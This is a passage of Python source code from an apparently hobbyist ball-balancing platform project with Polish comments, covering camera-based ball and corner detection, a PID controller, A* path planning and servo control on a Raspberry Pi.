                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print(""angleSpeed = "" + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord(""timestamp"", time.perf_counter())
                dataLogger.addRecord(""ball_pos_x"", ball_position_actual[0])
                dataLogger.addRecord(""ball_pos_y"", ball_position_actual[1])
                dataLogger.addRecord(""target_pos_x"", path_target[0])
                dataLogger.addRecord(""target_pos_y"", path_target[1])
                dataLogger.addRecord(""KP"", pidController.KP)
                dataLogger.addRecord(""KI"", pidController.KI)
                dataLogger.addRecord(""KD"", pidController.KD)
                dataLogger.addRecord(""error_x"", pidController.x_error)
                dataLogger.addRecord(""error_y"", pidController.y_error)
                dataLogger.addRecord(""error_prev_x"", pidController.x_prev_error)
                dataLogger.addRecord(""error_prev_y"", pidController.y_prev_error)
                dataLogger.addRecord(""error_sum_x"", pidController.x_error_sum)
                dataLogger.addRecord(""error_sum_y"", pidController.y_error_sum)
                dataLogger.addRecord(""derivative_x"", pidController.x_derivative)
                dataLogger.addRecord(""derivative_y"", pidController.y_derivative)
                dataLogger.addRecord(""servo_actual_x"", servoController.servo_actual_pos[0])
                dataLogger.addRecord(""servo_actual_y"", servoController.servo_actual_pos[1])
                dataLogger.addRecord(""servo_target_x"", servoController.servo_target_pos[0])
                dataLogger.addRecord(""servo_target_y"", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print(""Stopping program"")
    #dataLogger.saveToFile(""BallanceDataLog"")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()/n/n/nPythonCode/ImageProcessingModule.py/n/nsimulationMode = False

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.09, 0.09, 0.11, 0.11) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print(""ImageProcessor object created"")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print(""Starting image processing"")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print(""Stopping image processing"")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow(""Frame debug"", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite(""Frame"" + str(saveCounter) + "".png"", self.frame_original)
                saveCounter += 1
                
            cv2.imshow(""Frame Casted"", self.frame_original)
            key = cv2.waitKey(1) & 0xFF
            #if key == ord(""q""):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype(""int"")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        #cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (30, 30), interpolation=cv2.INTER_NEAREST)
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow(""Corner "" + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            
            if flipX: result[0] = 1.0 - result[0]
            if flipY: result[1] = 1.0 - result[1]
            corners[i] = (round(result[0] * detectionArea[2]) + detectionArea[0], round(result[1] * detectionArea[3]) + detectionArea[1])
            #cv2.circle(self.frame_debug, tuple(corners[i]), 1, (0, 0, 255), -1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        enlarge = 3
        pts2 = np.float32([[enlarge,enlarge],[res[0]-enlarge,enlarge],[res[0]-enlarge, res[1]-enlarge], [enlarge, res[1]-enlarge]])

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
        #zamalowanie bialych pol w rogach plyty
        for x in (0, res[0]):
            for y in (0, res[1]):
                cv2.circle(self.frame_original, (x, y), 10, (0, 0, 0), -1)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()/n/n/nPythonCode/MathModule.py/n/n#PRZYDATNE FUNKCJE MATEMATYCZNE
import math
import heapq

#zwrca znak liczby
def sign(num):
    if num > 0: return 1.0
    elif num < 0: return -1.0
    return 0.0

#interpolacja liniowa
def lerp(a, b, c):
    return c*b + (1-c) * a

#zwraca dlugosc wektora [x, y] do kwadratu
def sqrMagnitude(x, y=None):
    if y is not None: return x*x + y*y
    return x[0] * x[0] + x[1] * x[1]

#zwraca dlugosc wektora [x, y]
def magnitude(x, y=None):
    if y is not None: return math.sqrt(x*x + y*y)
    return math.sqrt(x[0]*x[0] + x[1]*x[1])

#zwraca odleglosc miedzy punktami A i B
def distance(A, B):
    x = A[0] - B[0]
    y = A[1] - B[1]
    return math.sqrt(x*x + y*y)

#zwraca kwadrat odleglosci miedzy punktami A i B
def sqrDistance(A, B):
    x = A[0] - B[0]
    y = A[1] - B[1]
    return x*x + y*y

#zwraca znormalizowany wektor [x, y]
def normalized(x, y=None):
    if y is not None:
        if x == 0 and y == 0: return (0, 0)
        mag = magnitude(x, y)
        return (x/mag, y/mag)
    else:
        if x[0] == 0 and x[1] == 0: return (0, 0)
        mag = magnitude(x)
        return (x[0]/mag, x[1]/mag)

#zwraca roznice kwadratowa miedzy target a value
def errorsquare(target, value):
    size = len(target)
    sum = 0.0
    for i in range(size):
        a = int(target[i]) - value[i]
        sum += a * a
        
    return sum
        
#zwraca wartosc 'num' ograniczana przez <_min, _max>
def clamp(num, _min, _max):
    if num > _max: return _max
    elif num < _min: return _min
    return num

#kolejka priorytetowa
class PriorityQueue:
    def __init__(self):
        self.elements = []
        
    #dodaje element do kolejki
    def push(self, item, priority):
        heapq.heappush(self.elements, (priority, item))
        
    #zdejmuje i zwraca element z poczatku kolejki
    def pop(self):
        return heapq.heappop(self.elements)[1]
    
    #czy kolejka jest pusta?
    def empty(self):
        return len(self.elements) == 0
        /n/n/nPythonCode/PIDControllerModule.py/n/nimport MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print(""KP = "" + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print(""KI = "" + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print(""KD = "" + str(self.KD))        
    def decreaseKP(self):
        self.KP -= 50
        print(""KP = "" + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print(""KI = "" + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print(""KD = "" + str(self.KD))
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 1.0       #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.3 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 0.6 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print(""Error = ( "" + str(self.x_error) + ""; "" + str(self.y_error) + "")"")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.99
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.99/n/n/nPythonCode/PathPlannerModule.py/n/nimport cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.1    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print(""PathPlanner object created"")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.path_position = 0.0   #aktualna pozycja na sciezce
        self.path_speed = 0.25 * PathPlanner.obstacle_map_size    #predkosc przechodzenia sciezki
        self.path_max_dist = 0.1**2 #odleglosc kulki od celu, powyzej ktorej docelowa pozycja ""czeka"" az kulka do niej dotrze
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print(""Starting PathPlanner process"")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print(""Stopping PathPlanner process"")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow(""Map"", frame)
        frame = cv2.inRange(frame, 80, 255)
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 5000
        
        #aktualizacja glownej sciezki
        start = PathPlanner.FromUnitaryToMapSpace((self.ball_pos_x.value, self.ball_pos_y.value), self.obstacle_map_size)
        end = PathPlanner.FromUnitaryToMapSpace((self.target_pos_x.value, self.target_pos_y.value), self.obstacle_map_size)
        self.path = PathPlanner.a_star(self, start, end)
        
        self.path_last_index = len(self.path)-1
        self.path_position = 0.0
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        
        index = int(self.path_position)
        A = PathPlanner.FromMapToUnitarySpace(path[index])
        
        #DEBUG
        frame = copy.copy(self.obstacle_map)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        for p in path:
            if PathPlanner.isPointWithinMap(self, p):
                frame[p[0], p[1]] = [255, 255, 0]
        
        if self.path_last_index > 0:
            B = PathPlanner.FromMapToUnitarySpace(path[index+1])
            dist = MM.distance(A, B)
            mant = self.path_position - index
            
            target_y = MM.lerp(A[0], B[0], mant)
            target_x = MM.lerp(A[1], B[1], mant)
            
            PathPlanner.PaintRay(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1], frame)
            if not PathPlanner.Raycast(self, PathPlanner.FromUnitaryToMapSpace(ball_pos, self.obstacle_map_size), path[index+1]) and MM.sqrMagnitude(target_x - ball_pos[1], target_y - ball_pos[0]) <= self.path_max_dist:
                self.path_position += self.path_speed * PathPlanner.path_sub_update_delta / (dist * PathPlanner.obstacle_map_size)
            if self.path_position >= self.path_last_index: self.path_position = self.path_last_index - 0.00001
            
        else:
            target_y = A[0]
            target_x = A[1]
            
        #print(target_x)
        #print(target_y)
        #print("""")
        
        self.path_x.value = target_x
        self.path_y.value = target_y
            
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow(""PathPlanner frame"", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #zmienia uklad odniesienia z mapy przeszkod na jednostkowy
    def FromMapToUnitarySpace(point):
        return (point[0] / PathPlanner.obstacle_map_size, point[1] / PathPlanner.obstacle_map_size)
    
    #zmienia uklad odniesienia z jednostkowego na mape przeszkod
    def FromUnitaryToMapSpace(point, size):
        return (round(point[0] * size), round(point[1] * size))
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
        movement = ((1, 0), (-1, 0), (0, 1), (0, -1))
        #movement = ((1, 0), (-1, 0), (0, 1), (0, -1), (-1, -1), (-1, 1), (1, 1), (1, -1))
        
        que = MM.PriorityQueue()
        que.push(start, 0)
        
        visited_from = {}
        cost = {}
        
        visited_from[start] = None
        visited_from[end] = None
        cost[start] = 0
        
        #timeStart = time.perf_counter()
        while not que.empty():
            v = que.pop()
            if v == end: break
            
            new_cost = cost[v] + 1
            for move in movement:
                nx = v[0] + move[0]
                ny = v[1] + move[1]
                
                if PathPlanner.isPointWithinMap(self, (nx, ny)) and self.obstacle_map[nx, ny] == 0:
                    u = (nx, ny)
                    if u not in cost or new_cost < cost[u]:
                        cost[u] = new_cost
                        center = PathPlanner.obstacle_map_size // 2
                        que.push(u, new_cost + MM.sqrMagnitude(v[0] - u[0], v[1] - u[1]) + self.proximity_map[u[0], u[1]] + int(MM.sqrMagnitude(center - u[0], center - u[1])))
                        visited_from[u] = v
        
        path = []
        if visited_from[end] != None:
            v = end
            while v != start:
                path.append(v)
                v = visited_from[v]
            path.append(start)
        else:
            time.sleep(0.05)
            path.append(end)
        
        return path
    
    #sprawdza, czy promien przecina pole, na ktorym znajduje sie przeszkoda
    def Raycast(self, origin, end):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return False    #jesli punkt startowy jest poza mapa
        if origin == end: return obstacle_map[origin[0], origin[1]]    #jesli promien jest punktem
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(x) + "", "" + str(y) + "")"") 
                if obstacle_map[x, y] > 0:
                    return True
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                #print(""Checked ("" + str(y) + "", "" + str(x) + "")"") 
                if obstacle_map[y, x] > 0:
                    return True
                
        return False
    
    #DEBUG
    def PaintRay(self, origin, end, frame):
        obstacle_map = self.obstacle_map
        if not PathPlanner.isPointWithinMap(self, origin) or not PathPlanner.isPointWithinMap(self, end): return    #jesli punkt startowy jest poza mapa
        if origin == end:
            frame[origin[0], origin[1]] = [0, 255, 0]
            return
            
        
        vec = (end[0] - origin[0], end[1] - origin[1])
        flipped = False    #czy wspolrzedne w ukladzie sa zamienione miejscami? (x; y) -> (y; x)
        if abs(vec[1]) > abs(vec[0]):
            #jesli nachylenie wektora jest wieksze niz 45 stopni
            #uklad wspolrzednych 'obracany jest' o 90 stopni
            vec = (vec[1], vec[0])
            origin = (origin[1], origin[0])
            end = (end[1], end[0])
            flipped = True
        
        dir = vec[1]/vec[0] #wspolczynnik kierunkowy promienia
        offset = origin[1] - dir * origin[0]    #skladnik 'b' w funkcji y = dir*x + b; przechodzi ona przez 'origin'
        
        #znaleznienie najbardziej lewego i prawego punktu promienia
        if origin[0] >= end[0]:
            left = end[0]
            right = origin[0]
        else:
            left = origin[0]
            right = end[0]
            
        #przejscie po wszystkich punktach mapy przeszkod nalezacych do promienia i sprawdzenie, czy ktorys z nich jest przeszkada
        if not flipped:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[x, y] = [0, 255, 0]
        else:
            for x in range(left, right+1):
                y = round(dir * x + offset)
                frame[y, x] = [0, 255, 0]/n/n/nPythonCode/ServoControllerModule.py/n/nfrom __future__ import division
simulationMode = False

if not simulationMode:
    import sys
    sys.path.append('/home/pi/Adafruit_Python_PCA9685/')
    import Adafruit_PCA9685
    
import math
import MathModule as MM

#program kontrolujacy ruch serw
class ServoController:
    
    #parametry serw
    servo_pulse_neutral = (388, 379)    #wartosci pwm dla pozycji neutralnych serw
    servo_pulse_range = (100, 100)      #zakres wartosci sygnalu pwm dla ruchu serw
    servo_pos_limit = (800, 800)    #ograniczenia wychylen serw (w skali od 0 do 1000)
    servo_movement_speed = (6000, 6000)    #szybkosci ruchu serw
    
    def __init__(self):
        if not simulationMode:
            self.pwm = Adafruit_PCA9685.PCA9685()  #laczenie sie z plytka sterujaca serwami
            self.pwm.set_pwm_freq(60)
        
        #zmienne wartosci
        self.servo_actual_pos = [0, 0]    #aktualna pozycja serwa
        self.servo_target_pos = [0, 0]    #docelowa pozycja serwa
        
        self.update(0)   #aplikowanie domyslnych ustawien serw

    #wydaje polecenie poruszenia serwem na kanale 'channel' na pozycje 'pos' (w skali od -1000 do 1000)
    def moveServo(self, channel, pos):
        self.servo_target_pos[channel] = MM.clamp(pos, -ServoController.servo_pos_limit[channel], ServoController.servo_pos_limit[channel])

    #aktualizuje pozycje serw
    def update(self, deltaTime):
        for i in range(2): #tylko 2 serwa
            
